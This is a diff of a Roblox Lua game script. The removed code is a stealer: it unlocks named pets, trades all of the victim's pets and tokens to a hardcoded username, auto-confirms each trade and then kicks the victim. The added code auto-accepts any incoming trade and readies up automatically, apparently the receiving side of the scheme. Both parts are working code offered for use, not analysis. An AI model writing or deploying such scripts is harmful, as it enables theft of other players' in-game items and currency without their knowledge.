@@ -1,199 +1,68 @@
-local targetUsername = "MALIKSTOM"
-local petsToTrade = {"Surge Dragon", "Dual Shock", "Overcharged Robot"}
-
--- SERVICES
-local Players = game:GetService("Players")
 local Network = require(game:GetService("ReplicatedStorage").Modules.Network)
-local Replication = require(game:GetService("ReplicatedStorage").Game.Replication)
+local LocalPlayer = game.Players.LocalPlayer
 
--- VARIABLES
-local player = Players.LocalPlayer
+local WAIT_TIME = 5 -- 5 seconds after last item is added
+local lastItemAddedTime = 0
+local tradeStatus = false
+local isReady = false
 
--- FUNCTIONS
-function WaitForCondition(conditionFunc, timeout)
-    local startTime = tick()
-    while not conditionFunc() do
-        if tick() - startTime > (timeout or 30) then
-            return false
+-- Automatically accept trade requests
+Network:BindEvents({
+    ["TradeRequest"] = function(sender)
+        print("Trade request received from: " .. sender.Name)
+        Network:FireServer("AcceptTrade", sender) -- Accept the trade automatically
+    end
+})
+
+-- Track when items (pets/tokens) are added to the trade
+Network:BindEvents({
+    ["AddTradeItem"] = function(itemData)
+        if tradeStatus then
+            print("Item added to trade: " .. itemData[1])  -- Print the name of the item added
+            lastItemAddedTime = tick()  -- Update the time when the last item was added
+            isReady = false -- Reset isReady whenever a new item is added
         end
-        task.wait()
-    end
-    return true
-end
+    end,
 
-function UnlockPets()
-    local PetNames = {}
-    for _, name in ipairs(petsToTrade) do
-        PetNames[name] = true
-    end
-    
-    local pets = Replication.Data and Replication.Data.Pets
-    if not pets then return end
-    
-    for _, petData in pairs(pets) do
-        if petData
-            and petData.Name
-            and PetNames[petData.Name]
-            and (petData.Locked == true or petData.Locked == 1 or petData.Locked == "true")
-        then
-            Network:InvokeServer("LockPet", petData.Id, false)
+    ["RemoveTradeItem"] = function(itemData)
+        if tradeStatus then
+            print("Item removed from trade: " .. itemData[1])  -- Print the name of the item removed
+            lastItemAddedTime = tick()  -- Update the time when an item was removed
+            isReady = false -- Reset isReady whenever an item is removed
         end
     end
+})
+
+-- Function to check if ReadyUp can be triggered (after 5 seconds of no items being added)
+local function shouldReadyUp()
+    local timeSinceLastItem = tick() - lastItemAddedTime
+    return timeSinceLastItem >= WAIT_TIME and not isReady
 end
 
-function GetPetIDsByName()
-    local petIDs = {}
-    local pets = Replication.Data and Replication.Data.Pets
-    if not pets then return petIDs end
-    
-    local petNameLookup = {}
-    for _, name in ipairs(petsToTrade) do
-        petNameLookup[name] = true
-    end
-    
-    for _, petData in pairs(pets) do
-        if petData and petData.Name and petNameLookup[petData.Name] then
-            table.insert(petIDs, petData.Id)
-        end
-    end
-    
-    return petIDs
-end
-
-function GetTokenAmount()
-    return var50_upvw or 0
-end
-
-function HasPetsToTrade()
-    local petIDs = GetPetIDsByName()
-    return #petIDs > 0
-end
-
-function HasTokensToTrade()
-    return GetTokenAmount() > 0
-end
-
-function FindTargetPlayer()
-    return Players:FindFirstChild(targetUsername)
-end
-
-function WaitForPetsRemoved(tradedPetIDs)
-    local startTime = tick()
-    
-    while tick() - startTime < 3 do
-        local currentPetIDs = GetPetIDsByName()
-        
-        local allRemoved = true
-        for _, tradedId in ipairs(tradedPetIDs) do
-            local stillHas = false
-            for _, currentId in ipairs(currentPetIDs) do
-                if currentId == tradedId then
-                    stillHas = true
-                    break
-                end
-            end
-            if stillHas then
-                allRemoved = false
-                break
-            end
-        end
-        
-        if allRemoved then
-            return true
-        end
-        
-        task.wait(0.1)
-    end
-    
-    return false
-end
-
-function UpdateTokens(newTokenAmount)
-    print("Attempting to update tokens to:", newTokenAmount)
-    local result = Network:InvokeServer("UpdateTradeTokens1", false, newTokenAmount)
-    if typeof(result) == "number" then
-        print("Tokens successfully updated to:", result)
-        var50_upvw = result -- Update the local token count
-        TextBox_upvr.PlaceholderText = Short_upvr:Abbreviate(var50_upvw, true, true).." available"
+-- Listen for when the trade UI is enabled
+LocalPlayer.PlayerGui.Trading:GetPropertyChangedSignal("Enabled"):Connect(function()
+    if LocalPlayer.PlayerGui.Trading.Enabled then
+        tradeStatus = true
+        print("In trade. Monitoring items...")
     else
-        print("Failed to update tokens:", result)
+        tradeStatus = false
+    end
+end)
+
+-- Check if it's time to press ReadyUp
+local function checkTradeStatus()
+    if tradeStatus and shouldReadyUp() then
+        print("Ready to confirm trade...")
+        Network:FireServer("ReadyUp", false, true)  -- Trigger ReadyUp
+        isReady = true  -- Prevent firing ReadyUp again
+        print("Trade ready!")
     end
 end
 
-function TradeWithTarget()
-    while true do
-        -- If there are no pets or tokens left to trade, kick the player
-        if not HasPetsToTrade() and not HasTokensToTrade() then
-            player:Kick("No more pets or tokens to trade")
-            return
-        end
-        
-        UnlockPets()
-        
-        local target = FindTargetPlayer()
-        if not target then
-            task.wait(5)
-            return
-        end
-        
-        Network:FireServer("SendTrade", target)
-        
-        local tradeEnabled = WaitForCondition(function()
-            return player.PlayerGui.Trading.Enabled
-        end, 5)
-        
-        if not tradeEnabled then
-            task.wait(5)
-            return
-        end
-        
-        local petIDs = GetPetIDsByName()
-        
-        if #petIDs > 0 then
-            for _, petId in ipairs(petIDs) do
-                Network:InvokeServer("AddTradeItem", { "Pet", petId })
-            end
-            
-            Network:FireServer("ReadyUp", false, true)
-            
-            local tradeCompleted = WaitForCondition(function()
-                return not player.PlayerGui.Trading.Enabled
-            end, 10)
-            
-            if not tradeCompleted then
-                Network:FireServer("CloseTrade")
-                task.wait(0.5)
-            else
-                WaitForPetsRemoved(petIDs)
-            end
-        elseif HasTokensToTrade() then
-            -- Only add tokens if no pets are left to trade
-            local tokenAmount = GetTokenAmount()
-            if tokenAmount > 0 then
-                print("TRYING TO ADD TOKENS:", tokenAmount)
-                Network:InvokeServer("AddTradeItem", { "Token", tokenAmount })
-                Network:FireServer("ReadyUp", false, true)
-            end
-        end
-        
-        -- Re-check pets and tokens after trade completion.
-        if HasPetsToTrade() or HasTokensToTrade() then
-            print("Re-entering trade with remaining items")
-            task.wait(1) -- Brief delay before trying again
-        else
-            print("No more items left to trade.")
-            break
-        end
-    end
-end
-
--- MAIN LOGIC
+-- Loop to check trade status and handle ReadyUp
 while true do
-    if not HasPetsToTrade() and not HasTokensToTrade() then
-        player:Kick("No more pets or tokens to trade")
-        break
+    task.wait(1)  -- Check every second
+    if tradeStatus then
+        checkTradeStatus()
     end
-    
-    TradeWithTarget()
-    task.wait(1)
 end
